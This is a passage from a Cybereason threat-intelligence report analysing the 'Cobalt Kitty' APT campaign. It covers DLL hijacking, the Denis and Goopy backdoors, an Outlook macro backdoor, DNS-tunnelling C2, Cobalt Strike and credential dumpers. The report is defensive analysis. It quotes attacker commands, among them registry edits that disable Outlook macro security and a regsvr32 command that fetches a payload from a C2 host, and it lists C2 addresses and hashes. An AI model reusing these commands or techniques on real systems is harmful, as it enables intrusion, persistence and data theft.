+PowerShell #2: 
+SCVHost.ps1 
+Injected host process:  
+PowerShell.exe 
+(via reflective DLL injection) 
+ 
+91E9465532EF967C93B1EF04B7A906A
+A533A370E 
+ 
+0d3a33cb848499a9404d099f8238a6a0e0
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+5 
+a4b471 
+ 
+3-in-1: Phantom DLL hijacking targeting Microsoft’s Wsearch  
+The “msfte.dll” payloads exploits a rather rare “phantom DLL hijacking” vulnerability against 
+components of Microsoft’s Windows Search to gain stealth, persistence and privilege 
+escalation all at once. There are only a few documented cases where it was used in an APT. 
+This vulnerability is found in all supported Windows versions (tested against Windows 7 to 10) 
+against the following applications:  
+ 
+SearchIndexer.exe (C:\Windows\System32\) 
+SearchProtocolHost.exe (C:\Windows\System32\) 
+ 
+These applications play a crucial role in Windows’ native search mechanism, and are launched  
+automatically by the Wsearch service, meaning that they also run as SYSTEM. From an 
+attacker perspective, exploiting these applications is very cost effective since it allows them to 
+achieve two goals simultaneously: persistence and privilege escalation to SYSTEM.  
+ 
+The core reason for this lies in the fact that these applications attempt to load a DLL called 
+“msfte.dll.” This DLL does not exist by default on Windows OS, hence, the name “phantom 
+DLL”. Attackers who gain administrative privileges can place a fake malicious “msfte.dll” under 
+“C:\Windows\System32\”, thus ensuring that the DLL will be loaded automatically by 
+SearchIndexer.exe and SearchProtocolHost.exe without properly validating the integrity of 
+the loaded module:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+6 
+*** Following responsible disclosure, this vulnerability was reported to Microsoft on April 
+1, 2017. 
+Functionality 
+The fake msfte.dll is not the core backdoor payload. It serves as a loader whose purpose is to 
+load the malicious code in a stealthy manner that will also ensure persistence. The actual 
+payload is decoded in memory and injected to other Windows host processes, such as: 
+svchost.exe, rundll32.exe and arp.exe. Once the core payload is injected, the backdoor will 
+commence C2 communication using DNS tunneling. The backdoor will send details about the 
+infected host, network and the users to the C&C server, and will wait for further instructions from 
+its operators. The main backdoor actions, as observed by Cybereason, consisted of:  
+● Deploying additional backdoors (goopdate.dll + Outlook backdoor) 
+● Reconnaissance and lateral movement commands (via cmd.exe) 
+● Deploying other hacking tools (Mimikatz, NetCat, PowerShell bypass tool, etc.) 
+ 
+ 
+The backdoor gives its operator the ability to perform different tasks on the infected machines, 
+depending on the commands (flags) received from C&C:  
+ 
+● Create/delete/move files and directories 
+● Execute shell commands used for reconnaissance and information gathering 
+● Enumerate users, drivers and computer name 
+● Query and set registry keys and values 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+7 
+ 
+ 
+Static analysis 
+The msfte.dll loader payloads were all compiled during the time of the attack, showing that the 
+attackers were preparing new samples on the fly. All observed loader payloads are 64-bit 
+payloads. However, the actual backdoor payload is always 32-bit (using WOW64). This is a 
+rather peculiar feature of this backdoor. The core backdoor payload was compiled using 
+Microsoft Visual Studio (C++), however, the loader does not carry any known compiler 
+signatures.  
+ 
+Another sign that the loader’s code was custom-built can be found when examining instructions 
+in the code that are clearly not compiler-generated. Instructions like CPUID, XMM 
+instructions/registers, xgetbv, as well as others, were placed within the binaries for the obvious 
+reason of anti-emulation. In addition, the loader’s code also contain many “common” anti-
+debugging 
+tricks, 
+using 
+APIs 
+such 
+as: 
+IsDebuggerPresent(), 
+OutputDebugString(), 
+SetLastError() and more.  
+ 
+The file structure does not contain any unusual sections:   
+ 
+ 
+However, the resources section does contains a base64-encoded payload:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+8 
+ 
+ 
+When decoding the base64 resource, there’s a large chunk of shellcode that is followed by a 
+corrupted PE file, whose internal name is “CiscoEapFast.exe”: 
+ 
+ 
+It’s interesting to mention that several samples of the Denis Backdoor that were caught in the 
+wild (not as part of this attack), were also named CiscoEapFast.exe. Please see the 
+Attackers’ Profile and Indicators of Compromise section for more information.    
+ 
+This embedded executable is the actual payload that is injected to the Windows host processes, 
+once the fake DLL is loaded and executed.  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+9 
+The loader’s export table lists over 300 exported functions. This is highly unusual for malware, 
+and is one of the most intriguing features: 
+ 
+ 
+If we take a look at the address that this RVA translates to in a live instance of msfte.dll (Image 
+base + 0x1060) here is what we see: 
+ 
+ 
+ 
+In other words, the author simply created a small do-nothing function (that just exits the current 
+process) for all of the exports to resolve to. Exports like this would have been generated at 
+compile-time, or implanted here using a highly sophisticated PE modification engine. This 
+indicates that this entire attack was planned in advance and that this binary was custom-built 
+to hijack specific applications. Indications of such pre-meditated design were found during 
+the attack, when more backdoor variants were discovered exploiting DLL-hijacking against 
+legitimate Kaspersky and Google applications.  
+ 
+Take the ability to exploit Kaspersky’s AVPIA application. Examination of the exported functions 
+clearly show that the attackers generated the same exports (e.g “CreateSetupProductInfo”) that 
+are found in a legitimate Kaspersky’s product_info.dll:  
+ 
+Exports of a legitimate product_info.dll 
+Exports of msfte.dll backdoor 
+File name: product_info.dll 
+SHA-1: 6a8c955e5e17ac1adfecedabbf8dcf0861a74f7 
+ 
+File name: msfte.dll 
+SHA-1: 
+C6a8c955e5e17ac1adfecedabbf8
+dcf0861a74f7 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+10 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Dynamic analysis 
+When the fake msfte.dll is loaded to searchindexer.exe or searchprotocolhost.exe, one of the 
+first steps it takes is to dynamically resolve critical APIs, using the good ol’ GetProcAddress() 
+and LoadLibrary() combination: 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+11 
+ 
+Then the loader will load the base-64 encoded payload from the resources section:  
+ 
+Variation in process injection routines 
+As mentioned earlier, the msfte.dll samples showed variation in the target host processes for 
+injection (svchost.exe, rundll32.exe and arp.exe). However, there’s also a variation in the 
+injection technique that was used to inject the payloads:  
+ 
+Process Injection 
+Target host processes: rundll32.exe 
+Process Hollowing 
+Target host processes: svchost.exe / arp.exe 
+Determining the path of target host process:  
+GetSystemDirectoryA → PathAppendA →   
+ 
+Process Injection routine:  
+CreateProcessA → VirtualAllocEx → 
+WriteProcessMemory  → CreateRemoteThread 
+Determining the path of target host process:  
+GetSystemDirectoryA → PathAppendA →   
+ 
+Process Hollowing routine:  
+CreateProcessA → VirtualAllocEx → 
+WriteProcessMemory  → Wow64GetThreadContext → 
+Wow64SetThreadContext → ResumeThread 
+ 
+Why the backdoor authors chose to implement two different process injection techniques is 
+unclear. But these implementations lead to some clear conclusions: 
+ 
+1. The use of PathAppendA API is common to both injections. This is a rather obscure API 
+that is not commonly observed in malware, at least not in the context of code injection.  
+2. Use of a less-common process hollowing implementation:  
+This style of process hollowing is quite uncommon. Usually in process hollowing, the 
+ZwUnmapViewOfSection or NtUnmapViewOfSection API functions are used to unmap 
+the original code. But in this case, the original target host process code is not mapped 
+out. Instead, the loader uses the Wow64SetThreadContext API to change the EAX 
+register to point to the malicious payload entry point rather than the entry point of the 
+original/authentic svchost executable in memory.  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+12 
+3. The use of Wow64 APIs indicates that the author went specifically out of their way to 
+utilize a 32-bit payload system, even thought that the loaders are 64-bit payloads.  
+The backdoor code 
+The injected payload consists of a long shellcode payload that is followed by a PE file, whose 
+MZ header as well as other sections of the PE structure have been corrupted for anti-analysis 
+purposes and also possibly to evade memory-based security solutions: 
+ 
+ 
+ 
+The purpose of the shellcode is to dynamically resolve the imports as well as to fix the 
+destroyed PE sections on the fly. The first step is to resolve kernel32.dll in order to import 
+GetProcAddress() and LoadLibrary() and through them dynamically resolve the rest of the 
+imported APIs:  
+ 
+Resolving GetProcAddress():  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+13 
+ 
+ 
+Once the repair is done, the shellcode will create a new RWX region, and copy the PE there, 
+leaving the MZ header remains corrupted:  
+ 
+ 
+ 
+The PE’s metadata contains the file name (“ciscoeapfast.exe”) and description (“Cisco EAP-
+FAST Module”). The metadata must have been manually altered by the backdoor authors to 
+make it look like a credible product:  
+ 
+SHA-1: E9DAB61AE30DB10D96FDC80F5092FE9A467F2CD3 
+ 
+ 
+The strings  “ciscoeapfast.exe” and “Cisco EAP-FAST Module” were found in most of the 
+samples of the Denis backdoor that were recovered during the investigation. In addition, the 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+14 
+threat actor has been using it in other attacks as well. Please see our Attackers’ Profile & 
+Indicators of Compromise section of this report.  
+ 
+Finally, the backdoor will decrypt important strings, such as IPs and domain names that are 
+necessary for the C&C communication via DNS Tunneling.  
+ 
+Excerpt from the domain decryption subroutine:  
+ 
+ 
+ 
+The following screenshot shows the final decrypted strings used for the DNS Tunneling 
+communication:  
+● DNS Server IPs: 208.67.222.222 (OpenDNS) and Google (8.8.8.8) 
+● Domain name: teriava(.)com 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+15 
+ 
+C2 communication 
+As mentioned before, the backdoor uses a stealthy C2 communication channel by implementing 
+DNS Tunneling. This technique uses DNS packets to transfer information between two hosts. In 
+general, this technique is considered to be rather stealthy since not many security products 
+perform deep packet inspection, which would detect this activity. The backdoor authors added 
+even more stealthy components to this technique and made sure that no direct connection was 
+established between the compromised machines and the real C&C servers.   
+ 
+The attackers used trusted DNS servers, such as OpenDNS and Google’s DNS servers, in 
+order to resolve the IPs of the domains that were hidden inside the DNS packets. Once the 
+packets reached the real C&C server, the base64-encoded part is stripped, decoded and re-
+assembled, thus enabling communication as well as data exfiltration. This is a rather slow yet 
+smart way to ensure that the traffic will not be filtered, since most organizations will not block 
+DNS traffic to Google or OpenDNS servers. This technique’s biggest caveat is that it can get 
+very “noisy” in terms of the unusual amount of DNS packets required to exfiltrate data such as 
+files and documents. 
+ 
+ 
+Example of the network traffic generated by the backdoor 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+16 
+The destination IP is Google’s 8.8.8.8 DNS server, and the DNS packet contain the real domain 
+in the query field. The data sent to the server comes in the form of a base64-encoded string, 
+which is appended as a subdomain:  
+ 
+ 
+Second backdoor: “Goopy” 
+ 
+ 
+The adversaries introduced another backdoor during the second stage of the attack. We named 
+it “Goopy”, since the backdoor’s vessel is a fake goopdate.dll file, which was dropped together 
+with a legitimate GoogleUpdate.exe application which is vulnerable to DLL hijacking and 
+placed the two files under a unique folder in APPDATA:  
+C:\users\xxxxxxxx\appdata\local\google\update\download\{GUID}\ 
+ 
+Seven unique samples of the “Goopy” backdoor were recovered by Cybereason:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+17 
+File name 
+SHA-1 
+goopdate.dll 
+9afe0ac621c00829f960d06c16a3e556cd0de249 
+973b1ca8661be6651114edf29b10b31db4e218f7 
+1c503a44ed9a28aad1fa3227dc1e0556bbe79919 
+2e29e61620f2b5c2fd31c4eb812c84e57f20214a 
+c7b190119cec8c96b7e36b7c2cc90773cffd81fd 
+185b7db0fec0236dff53e45b9c2a446e627b4c6a 
+ef0f9aaf16ab65e4518296c77ee54e1178787e21 
+ 
+The attackers used a legitimate and signed GoogleUpdate.exe application that is vulnerable 
+to DLL hijacking vulnerability:  
+GoogleUpdate.exe, SHA-1: d30e8c7543adbc801d675068530b57d75cabb13f,  
+ 
+ 
+GoogleUpdate’s DLL hijacking vulnerability was previously reported to already in 2014, since 
+other malware have been exploiting this vulnerability. Most notable ones are the notorious  
+PlugX and the CryptoLuck ransomware.  
+ 
+*** Following responsible disclosure, this vulnerability was reported to Google on April 2, 
+2017. 
+Analysis of Goopy 
+From features perspective, Goopy shows great similarities to the Denis backdoor. At the same 
+time, code analysis of the two backdoor clearly shows substantial differences between the two. 
+The coding style and other static features suggest that they were compiled (and possibly 
+authored)  by the same threat actor. One of the more interesting features of Goopy is that it 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+18 
+seems specifically designed to exploit a “DLL Hijacking” vulnerability against Google Update 
+(googleupdate.exe) using a fake goopdate.dll module. There may be other versions targeting 
+other applications, but the ones Cybereason obtained, specifically contained code that 
+specifically targeted GoogleUpdate. The Goopy backdoor was dropped and launched by the 
+Denis backdoor. The machines infected with Goopy had already been infected by the Denis 
+backdoor. Generally, it is not very common to see multiple backdoors from the same threat 
+actors residing on the same compromised machines. Nonetheless, this pattern was observed 
+on multiple machines throughout the attack.  
+ 
+Following are the most notable features that distinguish Goopy from Denis:  
+ 
+● Unusually large files (30MB to 55MB) - Compared to the Denis backdoor, which 
+ranges between 300KB and 1.7MB. This is quite unusual. The goopdate.dll files are 
+inflated with null characters, most probably to bypass security solutions that don’t inspect 
+large files.  
+ 
+In addition, the Goopy backdoor has a lot of junk code interlaced with real functions - to 
+make analysis harder. One example is in a giant subroutine that contains more than 
+5600 nodes, containing  many anti-debugging / anti-disassembly tricks, including infinite 
+loops:  
+ 
+ 
+● Specifically tailored to target GoogleUpdate -  The Goopy payloads contain a hard-
+coded verification made to ensure that the backdoor is loaded and executed by 
+GoogleUpdate. If the check fails,  the backdoor will terminate the googleupdate process 
+and exit. By comparison, The Denis backdoor loader is more “naive”, since it doesn’t 
+check from which process the backdoor is executed, thus making it also more flexible, 
+since it can exploit DLL hijacking on any given vulnerable application:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+19 
+ 
+ 
+● Stealthier and more advanced - Unlike the Denis backdoor, goopdate.dll shows 
+significant signs of post-compilation modification. The code section of this PE is 
+extremely interesting and unusual, and demonstrates the potential of a very powerful 
+code-generation engine underlying it. The backdoor’s code and data are well protected 
+and are decrypted at runtime, using a complex polymorphic decryptor. The polymorphic 
+decryptor is comprised of thousands of lines that are interlaced with junk API calls and 
+nonsense code in order to thwart analysis. Here’s an example:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+20 
+● HTTP Communication  - Unlike the Denis backdoor, Goopy was observed 
+communicating over HTTP (port 80 and 443),  in addition to its DNS-based C2 channel:   
+ 
+ 
+ 
+DNS resolution of the C&C server IP:  
+ 
+ 
+ 
+Example of HTTP usage, as observed using Wireshark to log the network traffic 
+generated by Goopy: 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+21 
+ 
+● Different DNS tunneling implementation - Unlike the main backdoor, this variant 
+implements a different algorithm for the C2 communication over DNS tunneling and also 
+used DNS TXT records. In addition, most of the samples communicated directly with the 
+C&C servers over DNS, unlike the Denis backdoor that comes pre-configured with 
+Google and OpenDNS as their intermediary DNS servers:  
+ 
+ 
+ 
+● Different Mutex creation routine - The mutex creation routine exhibited in “Goopy” is 
+different from the main backdoor, which is made out of a pseudo-random generated 
+value that is appended to the user name:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+22 
+ 
+ 
+As opposed to the Denis’ mutex pattern, which has a pseudo-random generated value 
+appended to the user name, the mutex format is different and contains neither curly brackets 
+nor dashes:  
+ 
+ 
+ 
+ 
+● Persistence - While Denis uses Window’s Wsearch Service for persistence, Goopy 
+uses also scheduled tasks to ensure that the backdoor is running. The scheduled task 
+runs every hour. If the backdoor’s mutex is detected, the newly run process will exit.  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+23 
+DLL side loading against legitimate applications 
+ 
+ 
+The attackers used DLL side loading, a well-known technique for evading detection that uses 
+legitimate applications to run malicious payloads. In Cobalt Kitty, the attackers used DLL side 
+loading against software from Kaspersky, Microsoft and Google. The hackers likely picked these 
+programs since they’re from reputed vendors, making users unlikely to question the processes 
+these programs run and decreasing the chances that analysts will scrutinize them. For example, 
+the attackers used the following legitimate Avpia.exe binary: 
+ 
+SHA-1: 691686839681adb345728806889925dc4eddb74e 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+24 
+They dropped the legitimate avpia.exe along with a fake DLL “product_info.dll” into 
+PROGRAMDATA:  
+SHA-1: 3cf4b44c9470fb5bd0c16996c4b2a338502a7517
+ 
+The payload found in the fake product_info.dll communicates with domain and IP that was 
+previously used in the attack in to drop Cobalt Strike payloads:  
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+25 
+Outlook backdoor macro 
+ 
+ 
+During the third phase of the attack, the attackers introduced a new way to communicate with 
+their C&C servers: an Outlook macro that serves as a backdoor. This backdoor is very unique 
+and was not documented before to be used in APTs. The only references that come close to 
+that type of Outlook backdoor are theoretical papers by the NSA (unclassified paper from 2000) 
+as well as a research paper presented by a group of security researchers in 2011.   
+ 
+The attackers replaced Outlook’s original VbaProject.OTM file, which contains Outlook’s 
+macros, with a malicious macro that serves as the backdoor. The backdoor receives commands 
+from a Gmail address operated by the threat actor, executes them on the compromised 
+machines and sends the requested information to the attacker’s Gmail account.  
+ 
+This technique was observed only on a handful of compromised machines that belonged to top-
+level management and were already compromised by at least one other backdoor. 
+ 
+Before the attackers deployed the macro-based backdoor, they had to take care of two things:  
+1. Creating persistence 
+The attackers modified specific registry values to create persistence: 
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Office\14\Outlook" /v 
+"LoadMacroProviderOnBoot" /f /t REG_DWORD /d 1 
+2. Disabling Outlook’s security policies 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+26 
+To do that, the attackers modified Outlook’s security settings to enable the macro to 
+run without prompting any warnings to the users:  
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Office\14\Outlook\Security" 
+/v "Level" /f /t REG_DWORD /d 1 
+ 
+Finally, the attackers replaced the existing VbaProject.OTM with the fake macro:  
+/u /c cd c:\programdata\& copy VbaProject.OTM 
+C:\Users\[REDACTED]\AppData\Roaming\Microsoft\Outlook 
+ 
+VbaProject.OTM, SHA-1:320e25629327e0e8946f3ea7c2a747ebd37fe26f 
+ 
+The backdoor macro  
+Once installed and executed, the macro performed these actions:  
+1. Search for new instructions - The macro will loop through the contents of Outlook’s inbox 
+and searches for the strings “$$cpte” and “$$ecpte” inside an email’s body. These two strings 
+mark the start and end of the strings the attackers are sending. 
+ 
+The “beauty” of using these markers is that the attackers don’t need to embed their email 
+addresses in the macro code, and can change as many addresses as they want. They only 
+need to include the start-end markers:  
+ 
+ 
+2. Write the message to temp file - When the macro finds an email whose content matches 
+the strings, the message body is copied to %temp%\msgbody.txt : 
+ 
+ 
+3. Delete the email - The backdoor authors were keen to dispose of the evidence quickly to 
+avoid raising any suspicions from the victims. Once the email content is copied, the macro 
+deletes the email from the inbox:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+27 
+ 
+ 
+4. Then the msgbody is parsed and the string between the start-end markers is passed as a 
+command to cmd.exe: 
+ 
+ 
+5. Acknowledgement  - After the command is executed, the macro will send an 
+acknowledgment email to the attackers’ Gmail account (“OK!”), which it will obtain from the 
+deleted items folder. Then it will delete the email from the sent items folder.  
+ 
+6. Exfiltrate data - The macro will send the requested data back to the attackers as an 
+attachment, after it obtains the address from the deleted items folder.  
+ 
+This unique data exfiltration technique was detected by Cybereason:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+28 
+ 
+ 
+Analysis of the commands sent by the attackers showed that they were mainly interested in:  
+1. Proprietary information - They attempted to exfiltrate sensitive documents from the 
+targeted departments that contained trade secrets and other proprietary information. 
+2. Reconnaissance -  The attackers kept collecting information about the compromised 
+machine as well as the network using commands like: ipconfig, netstat and net user. 
+Cobalt Strike 
+Cobalt Strike is a well-known, commercial offensive security framework that is popular among 
+security professionals and is mainly used for security assessments and penetration testing.  
+However, illegal use of this framework has been reported in the past in the context of advanced 
+persistent threats (APTs). Cobalt Strike is also one of the main links of this APT to the 
+OceanLotus group. This group is particularly known for using Cobalt Strike in its different APT 
+campaigns throughout Asia.  
+ 
+The adversaries extensively used this framework during this attack, particularly during the first 
+and fourth stages. Cobalt Strike’s Beacon was the main tool used in the attack, as shown in the 
+following screenshot, which shows memory strings of one of the payloads used in the attack 
+(ed074a1609616fdb56b40d3059ff4bebe729e436): 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+29 
+ 
+ 
+The attackers also used a range of other Cobalt Strike and Metasploit tools such as loaders and 
+stagers, especially during the fileless first stage of the operation, which relied mainly on Cobalt 
+Strike’s PowerShell payloads.  
+COM Scriptlets (.sct payloads) 
+In phases one and two, the attackers used PowerShell scripts to download COM Scriptlets 
+containing malicious code that ultimately used to download a Cobalt Strike beacon. An almost 
+identical usage of this technique (and even payload names) was seen in other APTs carried out 
+by the OceanLotus group.  This technique is very well documented and has gained popularity in 
+recent attacks, especially because it’s effectiveness in bypassing Window’s Application 
+Whitelisting. For further details about this technique, please refer to: 
+http://subt0x10.blogspot.jp/2016/04/setting-up-homestead-in-enterprise-with.html 
+http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-
+pentesting.html 
+http://subt0x10.blogspot.co.il/2016/04/bypass-application-whitelisting-script.html 
+In the screenshot below, an injected rundll32.exe process spawns a cmd.exe process that 
+launches regsvr32.exe in order to download a file from the C&C server. 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+30 
+ 
+ 
+The command line of the regsvr32.exe process is:  
+regsvr32 /s /n /u /i:hxxp://108.170.31.69:80/a scrobj.dll 
+  
+Additional examples of payloads observed in the attack using COM scriplets: 
+hxxp://108.170.31.69/a – 
+02aa9ad73e794bd139fdb46a9dc3c79f4ff91476 
+hxxp://images.verginnet.info:80/ppap.png - 
+f0a0fb4e005dd5982af5cfd64d32c43df79e1402 
+hxxp://support(.)chatconnecting.com/pic.png - 
+f3e27ad08622060fa7a3cc1c7ea83a7885560899 
+  
+The downloaded file appears to be a COM Scriptlets (.sct): 
+ 
+ 
+These COM Scriptlets serve two main purposes: 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+31 
+1. Bypass Window’s Application Whitelisting security mechanism. 
+2. Download additional payloads from the C&C server (mostly beacon).  
+  
+The COM scriptlet contains a VB macro with an obfuscated payload:  
+ 
+ 
+After decoding the encoded part, it can be clearly seen that the payload uses Windows APIs 
+that are indicative of process injection.  In addition, it is possible to see that the attackers aimed 
+to evade detection by “renaming” process injection-related functions and also adding spaces to 
+break signature patterns:  
+ 
+In addition, the decoded code contains contains a suspicious looking array (shellcode) as well 
+as the process injection function to Rundll32.exe:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+32 
+ 
+ 
+The decoded shellcode is similar to other downloader payloads observed in this attack, whose 
+purpose is to download and execute Cobalt Strike Beacon payload: 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+33 
+Obfuscation and evasion 
+Don’t-Kill-My-Cat  
+Most of the PowerShell payloads seen in the attack were wrapped and obfuscated using a 
+framework called Don’t-Kill-My-Cat (DKMC) that is found on GitHub. This framework generates 
+payloads especially designed to evade antivirus solutions. The unique strings used by this 
+framework perfectly match the malicious payloads that were collected during the attack, as 
+demonstrated below:  
+ 
+DKMC’s source code:   
+https://github.com/Mr-Un1k0d3r/DKMC/blob/master/core/util/exec-sc.ps1 
+ 
+ 
+ 
+The same framework was previously observed in PowerShell payloads of the OceanLotus 
+Group, as can be seen in a screenshot taken from a previous report:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+34 
+ 
+ 
+ 
+Examples of Don’t-Kill-My-Cat used in Cobalt Kitty 
+ 
+Example 1: Cobalt Strike Beacon payload found in ProgramData 
+ 
+File: C:\ProgramData\syscheck\syscheck.ps1 
+SHA-1: 7657769F767CD021438FCCE96A6BEFAF3BB2BA2D 
+ 
+  
+ 
+ 
+Example 2: Cobalt Strike Beacon payload from C&C server 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+35 
+SHA-1: 6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09 
+ 
+ 
+Invoke-obfuscation (PowerShell Obfuscator) 
+In the fourth phase of the attack, the attackers changed their PowerShell obfuscation framework 
+and used a new tool called “
+”, which is written by Daniel Bohannon and 
+available on GitHub. This tool was recently observed being used by the OceanLotus Group in 
+APTs in Vietnam.  
+ 
+The attackers used it to obfuscate their new PowerShell payloads, which consisted mainly of 
+Cobalt Strike Beacon, Mimikatz and a custom-built credential dumper. Below is an example of a 
+PowerShell payload of a custom credential dumper that was obfuscated with “Invoke-
+Obfuscation”:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+36 
+ 
+PowerShell bypass tool (PSUnlock) 
+During the attack’s fourth phase, the attackers attempted to revive the PowerShell infrastructure 
+that was shut down during the attack’s first phase.   
+ 
+To restore the ability to use Cobalt Strike and other PowerShell-based tools, the attackers used 
+a slightly customized version of a tool called PSunlock, which is available on GitHub. The tool 
+provides a way to bypass Windows Group Policies preventing PowerShell execution, and 
+execute PowerShell scripts without running PowerShell.exe.  
+ 
+Two different payloads of this tool were observed on the compromised machines:  
+52852C5E478CC656D8C4E1917E356940768E7184 - pshdll35.dll 
+EDD5D8622E491DFA2AF50FE9191E788CC9B9AF89 - pshdll40.dll 
+The metadata of the file clearly shows that these files are linked to the PSUnlock project:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+37 
+ 
+Examples of usage 
+The attackers changed the original (.exe) file to a .dll file and launched it with Rundll32.exe, 
+passing the desired PowerShell script as an argument using the “-f” flag:  
+RUNDLL32 C:\ProgramData\PShdll35.dll,main -f C:\ProgramData\nvidia.db 
+ 
+The script actually contains a Cobalt Strike Beacon payload, as shown in the screenshot below, 
+containing the beacon’s indicative strings:  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+38 
+Credential dumpers 
+The attackers used at least four different kinds of credential dumping tools. Some were custom-
+built for this operation and others were simply obfuscated to evade detection.  
+ 
+The main credential dumpers were:  
+1. Mimikatz 
+2. GetPassword_x64 
+3. Custom Windows Credential Dumper 
+4. Customized HookChangePassword 
+Mimikatz 
+Benjamin Delpy’s Mimikatz is one of the most popular credential dumping and post-exploitation 
+tools. It was definitely among the threat actor’s favorite tools: it played a major role in helping 
+harvest credentials and carry out lateral movement. The attackers successfully uploaded and 
+executed at least 14 unique Mimikatz payloads, wrapped and obfuscated using different tools. 
+ 
+ The following types of Mimikatz payloads were the the most used types:  
+1. Packed Mimikatz binaries (using custom and known packers) 
+2. PowerSploit’s “Invoke-Mimikatz.ps1” 
+3. Mimikatz obfuscated with subTee's PELoader 
+While most antivirus vendors would detect the official Mimikatz binaries right away, it is still very 
+easy to bypass the antivirus detection using different packers or obfuscators.  
+ 
+During the attack’s first and second phases, the adversaries mainly used the packed binaries of 
+Mimikatz as well as the PowerSploit’s “Invoke-Mimikatz.ps1.” As a result, it was very easy to 
+detect Mimikatz usage just by looking for indicative command line arguments, as demonstrated 
+here:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+39 
+However, during the third and fourth phases of the attack, the attackers attempted to 
+improve their “stealth”, and started using Malwaria’s PELoader Mimikatz:  
+ 
+ 
+ 
+The “system.exe” binary is  based on Malwaria’s PELoader, which is written using the .NET 
+framework and is fairly easy to decompile. It’s stealthier because it dynamically loads Mimikatz’s 
+binary from the resources section of the PE, and then passes the relevant arguments internally, 
+without leaving traces in the process command line arguments:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+40 
+ 
+ 
+Examining the the resources section, one can see a large base64-encoded section:  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+After decoding it, we can see the MZ header - indicating that indeed a PE file was hidden inside 
+the resources section:  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+41 
+ 
+ 
+ 
+ 
+Similar to the original file, this file is also a .NET application, so it was easy to decompile:  
+ 
+ 
+ 
+Examining the resources section shows the base64 embedded file:  
+ 
+ 
+ 
+After decoding the base64 section, we see that it is another PE file, which is the original 
+Mimikatz payload taken from GitHub:  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+42 
+ 
+GetPassword_x64 
+GetPassword_x64 is a known, publicly available password dumping tool by the K8Team. 
+It was one of the tools used by Chinese “Emissary Panda” group, also known as “Threat Group-
+3390 (TG-3390)” in Operation Iron Tiger, as reported by TrendMicro.   
+ 
+It is interesting to notice that this tool’s hash, was the one out of the two hashes that were 
